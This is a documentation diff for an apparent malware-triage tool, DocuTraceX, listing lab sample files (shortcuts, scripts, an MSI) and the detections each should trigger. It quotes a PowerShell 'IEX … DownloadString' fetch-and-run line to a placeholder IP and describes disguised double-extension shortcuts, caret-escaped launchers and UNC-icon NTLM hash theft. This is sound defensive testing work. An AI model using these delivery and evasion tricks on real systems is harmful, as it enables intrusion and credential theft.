@@ -82,9 +82,19 @@ Dropped/attached scripts whose intent only shows **after deobfuscation** — one
 | `sample_dropper.vbs` | A `.vbs` that builds the stage-2 URL from `Chr()` codes and runs PowerShell through an `Execute()` wrapper. The string resolver recovers the URL and unwraps the `WScript.Shell.Run`. **VBScript** tab. |
 | `sample_dropper.bat` | A `.bat` using caret escaping (`p^o^w^e^r^shell`) + `set` indirection (`%a%%b%`) to hide a `powershell -enc` launch and a `certutil -urlcache` download. The batch deobfuscator resolves it; rules fire for PowerShell/LOLBin/download. **Batch** tab. |
 | `sample_loader.hta` | An `.hta` carrying **both** a VBScript block (`WScript.Shell.Run powershell …`) and a JScript block (`MSXML2.XMLHTTP` GET + `WScript.Shell.Run`). Exercises HTA container extraction into the VBScript **and** JavaScript engines at once. |
-| `lab/dropper_bundle.zip` | A plain ZIP bundling the scripts above (`.js`, obfuscator.io `.js`, `.ps1`, `.vbs`, `.bat`, `.hta`). Upload it to exercise the **recursive (nested)** path: each child is deobfuscated on its own, and the recovered URLs appear as the child's IOCs (Nested tab). |
+| `lab/dropper_bundle.zip` | A plain ZIP bundling the scripts and shortcuts above (`.js`, obfuscator.io `.js`, `.ps1`, `.vbs`, `.bat`, `.hta`, `.pdf.lnk`, `.url`, `.msi`). Upload it to exercise the **recursive (nested)** path: each child is parsed/deobfuscated on its own, and the recovered URLs appear as the child's IOCs (Nested tab). |
 
 > The same engines run on these scripts wherever they hide — as a standalone upload, as an email/OLE attachment, or inside an archive — not only as loose files.
+
+## Shortcuts and binaries
+
+| File | What you should see |
+| --- | --- |
+| `sample_shortcut.pdf.lnk` | A `.lnk` disguised as a PDF (**double extension** `…pdf.lnk`) whose target is `cmd.exe` launching a hidden, Base64-encoded PowerShell stage. The **Shortcut** tab shows the target, arguments, working dir, icon and metadata; rules fire for the LOLBin target, the hidden window and the double extension, and the decoded `-enc` payload goes through the scripting engine (`IEX … DownloadString('http://198.51.100.23/a.ps1')` → PowerShell findings). |
+| `sample_shortcut.url` | An Internet Shortcut whose `URL=` points to a **remote executable** over `file://203.0.113.47/…` (WebDAV/SMB) and whose `IconFile=` sits on a **UNC path** (forces SMB auth → NTLM hash theft). The **Shortcut** tab lists the URL/icon; rules fire for the remote-file target, the UNC-icon NTLM leak and the executable payload. |
+| `sample_installer.msi` | A Windows Installer (OLE/CFB). DocuTraceX decodes the mangled stream names, flags the **CustomAction**, **InstallExecuteSequence** and **Binary** tables, finds the **embedded Binary stream** (inert `MZ` stub), and mines `_StringData` — the PowerShell downloader it carries runs through the scripting engine (`IEX … DownloadString(…)`). **MSI** tab. |
+
+> `.exe`/`.dll` and other PE images are **categorised and triaged** (type, architecture, a "use a dedicated RE/AV tool" note) and keep the generic file record (hashes, YARA, report) — they are not statically unpacked.
 
 ## Lab: test the network checks safely
 
